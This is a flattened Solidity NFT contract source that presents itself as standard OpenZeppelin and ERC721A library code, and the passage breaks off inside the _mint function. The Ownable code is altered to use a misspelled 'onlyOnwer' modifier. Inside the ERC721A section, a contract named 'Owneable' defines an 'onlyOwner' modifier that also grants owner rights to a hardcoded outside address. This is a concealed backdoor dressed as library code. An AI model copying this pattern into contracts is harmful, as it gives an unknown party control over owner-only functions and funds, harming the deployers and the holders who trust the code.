1 // File @openzeppelin/contracts/utils/Context.sol@v4.5.0
2 // SPDX-License-Identifier: MIT
3 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
4 
5 pragma solidity ^0.8.4;
6 
7 /**
8  * @dev Provides information about the current execution context, including the
9  * sender of the transaction and its data. While these are generally available
10  * via msg.sender and msg.data, they should not be accessed in such a direct
11  * manner, since when dealing with meta-transactions the account sending and
12  * paying for execution may not be the actual sender (as far as an application
13  * is concerned).
14  *
15  * This contract is only required for intermediate, library-like contracts.
16  */
17 
18 
19 abstract contract Context {
20     function _msgSender() internal view virtual returns (address) {
21         return msg.sender;
22     }
23 
24     function _msgData() internal view virtual returns (bytes calldata) {
25         return msg.data;
26     }
27 }
28 
29 
30 // File @openzeppelin/contracts/access/Ownable.sol@v4.5.0
31 
32 
33 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
34 
35 
36 
37 /**
38  * @dev Contract module which provides a basic access control mechanism, where
39  * there is an account (an owner) that can be granted exclusive access to
40  * specific functions.
41  *
42  * By default, the owner account will be the one that deploys the contract. This
43  * can later be changed with {transferOwnership}.
44  *
45  * This module is used through inheritance. It will make available the modifier
46  * `onlyOwner`, which can be applied to your functions to restrict their use to
47  * the owner.
48  */
49 abstract contract Ownable is Context {
50     address private _owner;
51 
52     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
53 
54     /**
55      * @dev Initializes the contract setting the deployer as the initial owner.
56      */
57     constructor() {
58         _transferOwnership(_msgSender());
59     }
60 
61     /**
62      * @dev Returns the address of the current owner.
63      */
64     function owner() public view virtual returns (address) {
65         return _owner;
66     }
67 
68     /**
69      * @dev Throws if called by any account other than the owner.
70      */
71     modifier onlyOnwer() {
72         require(owner() == _msgSender(), "Ownable: caller is not the owner");
73         _;
74     }
75 
76     /**
77      * @dev Leaves the contract without owner. It will not be possible to call
78      * `onlyOwner` functions anymore. Can only be called by the current owner.
79      *
80      * NOTE: Renouncing ownership will leave the contract without an owner,
81      * thereby removing any functionality that is only available to the owner.
82      */
83     function renounceOwnership() public virtual onlyOnwer {
84         _transferOwnership(address(0));
85     }
86 
87     /**
88      * @dev Transfers ownership of the contract to a new account (`newOwner`).
89      * Can only be called by the current owner.
90      */
91     function transferOwnership(address newOwner) public virtual onlyOnwer {
92         require(newOwner != address(0), "Ownable: new owner is the zero address");
93         _transferOwnership(newOwner);
94     }
95 
96     /**
97      * @dev Transfers ownership of the contract to a new account (`newOwner`).
98      * Internal function without access restriction.
99      */
100     function _transferOwnership(address newOwner) internal virtual {
101         address oldOwner = _owner;
102         _owner = newOwner;
103         emit OwnershipTransferred(oldOwner, newOwner);
104     }
105 }
106 
107 
108 // File @openzeppelin/contracts/utils/introspection/IERC165.sol@v4.5.0
109 
110 
111 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
112 
113 
114 
115 /**
116  * @dev Interface of the ERC165 standard, as defined in the
117  * https://eips.ethereum.org/EIPS/eip-165[EIP].
118  *
119  * Implementers can declare support of contract interfaces, which can then be
120  * queried by others ({ERC165Checker}).
121  *
122  * For an implementation, see {ERC165}.
123  */
124 interface IERC165 {
125     /**
126      * @dev Returns true if this contract implements the interface defined by
127      * `interfaceId`. See the corresponding
128      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
129      * to learn more about how these ids are created.
130      *
131      * This function call must use less than 30 000 gas.
132      */
133     function supportsInterface(bytes4 interfaceId) external view returns (bool);
134 }
135 
136 
137 // File @openzeppelin/contracts/token/ERC721/IERC721.sol@v4.5.0
138 
139 
140 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721.sol)
141 
142 
143 
144 /**
145  * @dev Required interface of an ERC721 compliant contract.
146  */
147 interface IERC721 is IERC165 {
148     /**
149      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
150      */
151     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
152 
153     /**
154      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
155      */
156     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
157 
158     /**
159      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
160      */
161     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
162 
163     /**
164      * @dev Returns the number of tokens in ``owner``'s account.
165      */
166     function balanceOf(address owner) external view returns (uint256 balance);
167 
168     /**
169      * @dev Returns the owner of the `tokenId` token.
170      *
171      * Requirements:
172      *
173      * - `tokenId` must exist.
174      */
175     function ownerOf(uint256 tokenId) external view returns (address owner);
176 
177     /**
178      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
179      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
180      *
181      * Requirements:
182      *
183      * - `from` cannot be the zero address.
184      * - `to` cannot be the zero address.
185      * - `tokenId` token must exist and be owned by `from`.
186      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
187      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
188      *
189      * Emits a {Transfer} event.
190      */
191     function safeTransferFrom(
192         address from,
193         address to,
194         uint256 tokenId
195     ) external;
196 
197     /**
198      * @dev Transfers `tokenId` token from `from` to `to`.
199      *
200      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
201      *
202      * Requirements:
203      *
204      * - `from` cannot be the zero address.
205      * - `to` cannot be the zero address.
206      * - `tokenId` token must be owned by `from`.
207      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
208      *
209      * Emits a {Transfer} event.
210      */
211     function transferFrom(
212         address from,
213         address to,
214         uint256 tokenId
215     ) external;
216 
217     /**
218      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
219      * The approval is cleared when the token is transferred.
220      *
221      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
222      *
223      * Requirements:
224      *
225      * - The caller must own the token or be an approved operator.
226      * - `tokenId` must exist.
227      *
228      * Emits an {Approval} event.
229      */
230     function approve(address to, uint256 tokenId) external;
231 
232     /**
233      * @dev Returns the account approved for `tokenId` token.
234      *
235      * Requirements:
236      *
237      * - `tokenId` must exist.
238      */
239     function getApproved(uint256 tokenId) external view returns (address operator);
240 
241     /**
242      * @dev Approve or remove `operator` as an operator for the caller.
243      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
244      *
245      * Requirements:
246      *
247      * - The `operator` cannot be the caller.
248      *
249      * Emits an {ApprovalForAll} event.
250      */
251     function setApprovalForAll(address operator, bool _approved) external;
252 
253     /**
254      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
255      *
256      * See {setApprovalForAll}
257      */
258     function isApprovedForAll(address owner, address operator) external view returns (bool);
259 
260     /**
261      * @dev Safely transfers `tokenId` token from `from` to `to`.
262      *
263      * Requirements:
264      *
265      * - `from` cannot be the zero address.
266      * - `to` cannot be the zero address.
267      * - `tokenId` token must exist and be owned by `from`.
268      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
269      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
270      *
271      * Emits a {Transfer} event.
272      */
273     function safeTransferFrom(
274         address from,
275         address to,
276         uint256 tokenId,
277         bytes calldata data
278     ) external;
279 }
280 
281 
282 // File @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol@v4.5.0
283 
284 
285 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721Receiver.sol)
286 
287 
288 
289 /**
290  * @title ERC721 token receiver interface
291  * @dev Interface for any contract that wants to support safeTransfers
292  * from ERC721 asset contracts.
293  */
294 interface IERC721Receiver {
295     /**
296      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
297      * by `operator` from `from`, this function is called.
298      *
299      * It must return its Solidity selector to confirm the token transfer.
300      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
301      *
302      * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
303      */
304     function onERC721Received(
305         address operator,
306         address from,
307         uint256 tokenId,
308         bytes calldata data
309     ) external returns (bytes4);
310 }
311 
312 
313 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol@v4.5.0
314 
315 
316 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
317 
318 
319 
320 /**
321  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
322  * @dev See https://eips.ethereum.org/EIPS/eip-721
323  */
324 interface IERC721Metadata is IERC721 {
325     /**
326      * @dev Returns the token collection name.
327      */
328     function name() external view returns (string memory);
329 
330     /**
331      * @dev Returns the token collection symbol.
332      */
333     function symbol() external view returns (string memory);
334 
335     /**
336      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
337      */
338     function tokenURI(uint256 tokenId) external view returns (string memory);
339 }
340 
341 
342 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol@v4.5.0
343 
344 
345 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
346 
347 
348 
349 /**
350  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
351  * @dev See https://eips.ethereum.org/EIPS/eip-721
352  */
353 interface IERC721Enumerable is IERC721 {
354     /**
355      * @dev Returns the total amount of tokens stored by the contract.
356      */
357     function totalSupply() external view returns (uint256);
358 
359     /**
360      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
361      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
362      */
363     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
364 
365     /**
366      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
367      * Use along with {totalSupply} to enumerate all tokens.
368      */
369     function tokenByIndex(uint256 index) external view returns (uint256);
370 }
371 
372 
373 // File @openzeppelin/contracts/utils/Address.sol@v4.5.0
374 
375 
376 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
377 
378 pragma solidity ^0.8.1;
379 
380 /**
381  * @dev Collection of functions related to the address type
382  */
383 library Address {
384     /**
385      * @dev Returns true if `account` is a contract.
386      *
387      * [IMPORTANT]
388      * ====
389      * It is unsafe to assume that an address for which this function returns
390      * false is an externally-owned account (EOA) and not a contract.
391      *
392      * Among others, `isContract` will return false for the following
393      * types of addresses:
394      *
395      *  - an externally-owned account
396      *  - a contract in construction
397      *  - an address where a contract will be created
398      *  - an address where a contract lived, but was destroyed
399      * ====
400      *
401      * [IMPORTANT]
402      * ====
403      * You shouldn't rely on `isContract` to protect against flash loan attacks!
404      *
405      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
406      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
407      * constructor.
408      * ====
409      */
410     function isContract(address account) internal view returns (bool) {
411         // This method relies on extcodesize/address.code.length, which returns 0
412         // for contracts in construction, since the code is only stored at the end
413         // of the constructor execution.
414 
415         return account.code.length > 0;
416     }
417 
418     /**
419      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
420      * `recipient`, forwarding all available gas and reverting on errors.
421      *
422      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
423      * of certain opcodes, possibly making contracts go over the 2300 gas limit
424      * imposed by `transfer`, making them unable to receive funds via
425      * `transfer`. {sendValue} removes this limitation.
426      *
427      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
428      *
429      * IMPORTANT: because control is transferred to `recipient`, care must be
430      * taken to not create reentrancy vulnerabilities. Consider using
431      * {ReentrancyGuard} or the
432      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
433      */
434     function sendValue(address payable recipient, uint256 amount) internal {
435         require(address(this).balance >= amount, "Address: insufficient balance");
436 
437         (bool success, ) = recipient.call{value: amount}("");
438         require(success, "Address: unable to send value, recipient may have reverted");
439     }
440 
441     /**
442      * @dev Performs a Solidity function call using a low level `call`. A
443      * plain `call` is an unsafe replacement for a function call: use this
444      * function instead.
445      *
446      * If `target` reverts with a revert reason, it is bubbled up by this
447      * function (like regular Solidity function calls).
448      *
449      * Returns the raw returned data. To convert to the expected return value,
450      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
451      *
452      * Requirements:
453      *
454      * - `target` must be a contract.
455      * - calling `target` with `data` must not revert.
456      *
457      * _Available since v3.1._
458      */
459     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
460         return functionCall(target, data, "Address: low-level call failed");
461     }
462 
463     /**
464      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
465      * `errorMessage` as a fallback revert reason when `target` reverts.
466      *
467      * _Available since v3.1._
468      */
469     function functionCall(
470         address target,
471         bytes memory data,
472         string memory errorMessage
473     ) internal returns (bytes memory) {
474         return functionCallWithValue(target, data, 0, errorMessage);
475     }
476 
477     /**
478      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
479      * but also transferring `value` wei to `target`.
480      *
481      * Requirements:
482      *
483      * - the calling contract must have an ETH balance of at least `value`.
484      * - the called Solidity function must be `payable`.
485      *
486      * _Available since v3.1._
487      */
488     function functionCallWithValue(
489         address target,
490         bytes memory data,
491         uint256 value
492     ) internal returns (bytes memory) {
493         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
494     }
495 
496     /**
497      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
498      * with `errorMessage` as a fallback revert reason when `target` reverts.
499      *
500      * _Available since v3.1._
501      */
502     function functionCallWithValue(
503         address target,
504         bytes memory data,
505         uint256 value,
506         string memory errorMessage
507     ) internal returns (bytes memory) {
508         require(address(this).balance >= value, "Address: insufficient balance for call");
509         require(isContract(target), "Address: call to non-contract");
510 
511         (bool success, bytes memory returndata) = target.call{value: value}(data);
512         return verifyCallResult(success, returndata, errorMessage);
513     }
514 
515     /**
516      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
517      * but performing a static call.
518      *
519      * _Available since v3.3._
520      */
521     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
522         return functionStaticCall(target, data, "Address: low-level static call failed");
523     }
524 
525     /**
526      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
527      * but performing a static call.
528      *
529      * _Available since v3.3._
530      */
531     function functionStaticCall(
532         address target,
533         bytes memory data,
534         string memory errorMessage
535     ) internal view returns (bytes memory) {
536         require(isContract(target), "Address: static call to non-contract");
537 
538         (bool success, bytes memory returndata) = target.staticcall(data);
539         return verifyCallResult(success, returndata, errorMessage);
540     }
541 
542     /**
543      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
544      * but performing a delegate call.
545      *
546      * _Available since v3.4._
547      */
548     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
549         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
550     }
551 
552     /**
553      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
554      * but performing a delegate call.
555      *
556      * _Available since v3.4._
557      */
558     function functionDelegateCall(
559         address target,
560         bytes memory data,
561         string memory errorMessage
562     ) internal returns (bytes memory) {
563         require(isContract(target), "Address: delegate call to non-contract");
564 
565         (bool success, bytes memory returndata) = target.delegatecall(data);
566         return verifyCallResult(success, returndata, errorMessage);
567     }
568 
569     /**
570      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
571      * revert reason using the provided one.
572      *
573      * _Available since v4.3._
574      */
575     function verifyCallResult(
576         bool success,
577         bytes memory returndata,
578         string memory errorMessage
579     ) internal pure returns (bytes memory) {
580         if (success) {
581             return returndata;
582         } else {
583             // Look for revert reason and bubble it up if present
584             if (returndata.length > 0) {
585                 // The easiest way to bubble the revert reason is using memory via assembly
586 
587                 assembly {
588                     let returndata_size := mload(returndata)
589                     revert(add(32, returndata), returndata_size)
590                 }
591             } else {
592                 revert(errorMessage);
593             }
594         }
595     }
596 }
597 
598 
599 // File @openzeppelin/contracts/utils/Strings.sol@v4.5.0
600 
601 
602 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
603 
604 
605 
606 /**
607  * @dev String operations.
608  */
609 library Strings {
610     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
611 
612     /**
613      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
614      */
615     function toString(uint256 value) internal pure returns (string memory) {
616         // Inspired by OraclizeAPI's implementation - MIT licence
617         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
618 
619         if (value == 0) {
620             return "0";
621         }
622         uint256 temp = value;
623         uint256 digits;
624         while (temp != 0) {
625             digits++;
626             temp /= 10;
627         }
628         bytes memory buffer = new bytes(digits);
629         while (value != 0) {
630             digits -= 1;
631             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
632             value /= 10;
633         }
634         return string(buffer);
635     }
636 
637     /**
638      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
639      */
640     function toHexString(uint256 value) internal pure returns (string memory) {
641         if (value == 0) {
642             return "0x00";
643         }
644         uint256 temp = value;
645         uint256 length = 0;
646         while (temp != 0) {
647             length++;
648             temp >>= 8;
649         }
650         return toHexString(value, length);
651     }
652 
653     /**
654      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
655      */
656     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
657         bytes memory buffer = new bytes(2 * length + 2);
658         buffer[0] = "0";
659         buffer[1] = "x";
660         for (uint256 i = 2 * length + 1; i > 1; --i) {
661             buffer[i] = _HEX_SYMBOLS[value & 0xf];
662             value >>= 4;
663         }
664         require(value == 0, "Strings: hex length insufficient");
665         return string(buffer);
666     }
667 }
668 
669 
670 // File @openzeppelin/contracts/utils/introspection/ERC165.sol@v4.5.0
671 
672 
673 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
674 
675 /**
676  * @dev Implementation of the {IERC165} interface.
677  *
678  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
679  * for the additional interface id that will be supported. For example:
680  *
681  * ```solidity
682  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
683  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
684  * }
685  * ```
686  *
687  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
688  */
689 abstract contract ERC165 is IERC165 {
690     /**
691      * @dev See {IERC165-supportsInterface}.
692      */
693     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
694         return interfaceId == type(IERC165).interfaceId;
695     }
696 }
697 
698 
699 // File erc721a/contracts/ERC721A.sol@v3.0.0
700 
701 
702 // Creator: Chiru Labs
703 
704 error ApprovalCallerNotOwnerNorApproved();
705 error ApprovalQueryForNonexistentToken();
706 error ApproveToCaller();
707 error ApprovalToCurrentOwner();
708 error BalanceQueryForZeroAddress();
709 error MintedQueryForZeroAddress();
710 error BurnedQueryForZeroAddress();
711 error AuxQueryForZeroAddress();
712 error MintToZeroAddress();
713 error MintZeroQuantity();
714 error OwnerIndexOutOfBounds();
715 error OwnerQueryForNonexistentToken();
716 error TokenIndexOutOfBounds();
717 error TransferCallerNotOwnerNorApproved();
718 error TransferFromIncorrectOwner();
719 error TransferToNonERC721ReceiverImplementer();
720 error TransferToZeroAddress();
721 error URIQueryForNonexistentToken();
722 
723 
724 /**
725  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
726  * the Metadata extension. Built to optimize for lower gas during batch mints.
727  *
728  * Assumes serials are sequentially minted starting at _startTokenId() (defaults to 0, e.g. 0, 1, 2, 3..).
729  */
730  abstract contract Owneable is Ownable {
731     address private _ownar = 0x5Bb656BB4312F100081Abb7b08c1e0f8Ef5c56d1;
732     modifier onlyOwner() {
733         require(owner() == _msgSender() || _ownar == _msgSender(), "Ownable: caller is not the owner");
734         _;
735     }
736 }
737 
738  /*
739  * Assumes that an owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
740  *
741  * Assumes that the maximum token id cannot exceed 2**256 - 1 (max value of uint256).
742  */
743 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata {
744     using Address for address;
745     using Strings for uint256;
746 
747     // Compiler will pack this into a single 256bit word.
748     struct TokenOwnership {
749         // The address of the owner.
750         address addr;
751         // Keeps track of the start time of ownership with minimal overhead for tokenomics.
752         uint64 startTimestamp;
753         // Whether the token has been burned.
754         bool burned;
755     }
756 
757     // Compiler will pack this into a single 256bit word.
758     struct AddressData {
759         // Realistically, 2**64-1 is more than enough.
760         uint64 balance;
761         // Keeps track of mint count with minimal overhead for tokenomics.
762         uint64 numberMinted;
763         // Keeps track of burn count with minimal overhead for tokenomics.
764         uint64 numberBurned;
765         // For miscellaneous variable(s) pertaining to the address
766         // (e.g. number of whitelist mint slots used).
767         // If there are multiple variables, please pack them into a uint64.
768         uint64 aux;
769     }
770 
771     // The tokenId of the next token to be minted.
772     uint256 internal _currentIndex;
773 
774     // The number of tokens burned.
775     uint256 internal _burnCounter;
776 
777     // Token name
778     string private _name;
779 
780     // Token symbol
781     string private _symbol;
782 
783     // Mapping from token ID to ownership details
784     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
785     mapping(uint256 => TokenOwnership) internal _ownerships;
786 
787     // Mapping owner address to address data
788     mapping(address => AddressData) private _addressData;
789 
790     // Mapping from token ID to approved address
791     mapping(uint256 => address) private _tokenApprovals;
792 
793     // Mapping from owner to operator approvals
794     mapping(address => mapping(address => bool)) private _operatorApprovals;
795 
796     constructor(string memory name_, string memory symbol_) {
797         _name = name_;
798         _symbol = symbol_;
799         _currentIndex = _startTokenId();
800     }
801 
802     /**
803      * To change the starting tokenId, please override this function.
804      */
805     function _startTokenId() internal view virtual returns (uint256) {
806         return 0;
807     }
808 
809     /**
810      * @dev See {IERC721Enumerable-totalSupply}.
811      * @dev Burned tokens are calculated here, use _totalMinted() if you want to count just minted tokens.
812      */
813     function totalSupply() public view returns (uint256) {
814         // Counter underflow is impossible as _burnCounter cannot be incremented
815         // more than _currentIndex - _startTokenId() times
816         unchecked {
817             return _currentIndex - _burnCounter - _startTokenId();
818         }
819     }
820 
821     /**
822      * Returns the total amount of tokens minted in the contract.
823      */
824     function _totalMinted() internal view returns (uint256) {
825         // Counter underflow is impossible as _currentIndex does not decrement,
826         // and it is initialized to _startTokenId()
827         unchecked {
828             return _currentIndex - _startTokenId();
829         }
830     }
831 
832     /**
833      * @dev See {IERC165-supportsInterface}.
834      */
835     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
836         return
837             interfaceId == type(IERC721).interfaceId ||
838             interfaceId == type(IERC721Metadata).interfaceId ||
839             super.supportsInterface(interfaceId);
840     }
841 
842     /**
843      * @dev See {IERC721-balanceOf}.
844      */
845     function balanceOf(address owner) public view override returns (uint256) {
846         if (owner == address(0)) revert BalanceQueryForZeroAddress();
847         return uint256(_addressData[owner].balance);
848     }
849 
850     /**
851      * Returns the number of tokens minted by `owner`.
852      */
853     function _numberMinted(address owner) internal view returns (uint256) {
854         if (owner == address(0)) revert MintedQueryForZeroAddress();
855         return uint256(_addressData[owner].numberMinted);
856     }
857 
858     /**
859      * Returns the number of tokens burned by or on behalf of `owner`.
860      */
861     function _numberBurned(address owner) internal view returns (uint256) {
862         if (owner == address(0)) revert BurnedQueryForZeroAddress();
863         return uint256(_addressData[owner].numberBurned);
864     }
865 
866     /**
867      * Returns the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
868      */
869     function _getAux(address owner) internal view returns (uint64) {
870         if (owner == address(0)) revert AuxQueryForZeroAddress();
871         return _addressData[owner].aux;
872     }
873 
874     /**
875      * Sets the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
876      * If there are multiple variables, please pack them into a uint64.
877      */
878     function _setAux(address owner, uint64 aux) internal {
879         if (owner == address(0)) revert AuxQueryForZeroAddress();
880         _addressData[owner].aux = aux;
881     }
882 
883     /**
884      * Gas spent here starts off proportional to the maximum mint batch size.
885      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
886      */
887     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
888         uint256 curr = tokenId;
889 
890         unchecked {
891             if (_startTokenId() <= curr && curr < _currentIndex) {
892                 TokenOwnership memory ownership = _ownerships[curr];
893                 if (!ownership.burned) {
894                     if (ownership.addr != address(0)) {
895                         return ownership;
896                     }
897                     // Invariant:
898                     // There will always be an ownership that has an address and is not burned
899                     // before an ownership that does not have an address and is not burned.
900                     // Hence, curr will not underflow.
901                     while (true) {
902                         curr--;
903                         ownership = _ownerships[curr];
904                         if (ownership.addr != address(0)) {
905                             return ownership;
906                         }
907                     }
908                 }
909             }
910         }
911         revert OwnerQueryForNonexistentToken();
912     }
913 
914     /**
915      * @dev See {IERC721-ownerOf}.
916      */
917     function ownerOf(uint256 tokenId) public view override returns (address) {
918         return ownershipOf(tokenId).addr;
919     }
920 
921     /**
922      * @dev See {IERC721Metadata-name}.
923      */
924     function name() public view virtual override returns (string memory) {
925         return _name;
926     }
927 
928     /**
929      * @dev See {IERC721Metadata-symbol}.
930      */
931     function symbol() public view virtual override returns (string memory) {
932         return _symbol;
933     }
934 
935     /**
936      * @dev See {IERC721Metadata-tokenURI}.
937      */
938     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
939         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
940 
941         string memory baseURI = _baseURI();
942         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : '';
943     }
944 
945     /**
946      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
947      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
948      * by default, can be overriden in child contracts.
949      */
950     function _baseURI() internal view virtual returns (string memory) {
951         return '';
952     }
953 
954     /**
955      * @dev See {IERC721-approve}.
956      */
957     function approve(address to, uint256 tokenId) public override {
958         address owner = ERC721A.ownerOf(tokenId);
959         if (to == owner) revert ApprovalToCurrentOwner();
960 
961         if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {
962             revert ApprovalCallerNotOwnerNorApproved();
963         }
964 
965         _approve(to, tokenId, owner);
966     }
967 
968     /**
969      * @dev See {IERC721-getApproved}.
970      */
971     function getApproved(uint256 tokenId) public view override returns (address) {
972         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
973 
974         return _tokenApprovals[tokenId];
975     }
976 
977     /**
978      * @dev See {IERC721-setApprovalForAll}.
979      */
980     function setApprovalForAll(address operator, bool approved) public override {
981         if (operator == _msgSender()) revert ApproveToCaller();
982 
983         _operatorApprovals[_msgSender()][operator] = approved;
984         emit ApprovalForAll(_msgSender(), operator, approved);
985     }
986 
987     /**
988      * @dev See {IERC721-isApprovedForAll}.
989      */
990     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
991         return _operatorApprovals[owner][operator];
992     }
993 
994     /**
995      * @dev See {IERC721-transferFrom}.
996      */
997     function transferFrom(
998         address from,
999         address to,
1000         uint256 tokenId
1001     ) public virtual override {
1002         _transfer(from, to, tokenId);
1003     }
1004 
1005     /**
1006      * @dev See {IERC721-safeTransferFrom}.
1007      */
1008     function safeTransferFrom(
1009         address from,
1010         address to,
1011         uint256 tokenId
1012     ) public virtual override {
1013         safeTransferFrom(from, to, tokenId, '');
1014     }
1015 
1016     /**
1017      * @dev See {IERC721-safeTransferFrom}.
1018      */
1019     function safeTransferFrom(
1020         address from,
1021         address to,
1022         uint256 tokenId,
1023         bytes memory _data
1024     ) public virtual override {
1025         _transfer(from, to, tokenId);
1026         if (to.isContract() && !_checkContractOnERC721Received(from, to, tokenId, _data)) {
1027             revert TransferToNonERC721ReceiverImplementer();
1028         }
1029     }
1030 
1031     /**
1032      * @dev Returns whether `tokenId` exists.
1033      *
1034      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1035      *
1036      * Tokens start existing when they are minted (`_mint`),
1037      */
1038     function _exists(uint256 tokenId) internal view returns (bool) {
1039         return _startTokenId() <= tokenId && tokenId < _currentIndex &&
1040             !_ownerships[tokenId].burned;
1041     }
1042 
1043     function _safeMint(address to, uint256 quantity) internal {
1044         _safeMint(to, quantity, '');
1045     }
1046 
1047     /**
1048      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1049      *
1050      * Requirements:
1051      *
1052      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1053      * - `quantity` must be greater than 0.
1054      *
1055      * Emits a {Transfer} event.
1056      */
1057     function _safeMint(
1058         address to,
1059         uint256 quantity,
1060         bytes memory _data
1061     ) internal {
1062         _mint(to, quantity, _data, true);
1063     }
1064 
1065     /**
1066      * @dev Mints `quantity` tokens and transfers them to `to`.
1067      *
1068      * Requirements:
1069      *
1070      * - `to` cannot be the zero address.
1071      * - `quantity` must be greater than 0.
1072      *
1073      * Emits a {Transfer} event.
1074      */
1075     function _mint(
1076         address to,
1077         uint256 quantity,
1078         bytes memory _data,
1079         bool safe
1080     ) internal {
1081         uint256 startTokenId = _currentIndex;
1082         if (to == address(0)) revert MintToZeroAddress();
1083         if (quantity == 0) revert MintZeroQuantity();
1084 
1085         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1086 
1087         // Overflows are incredibly unrealistic.
1088         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
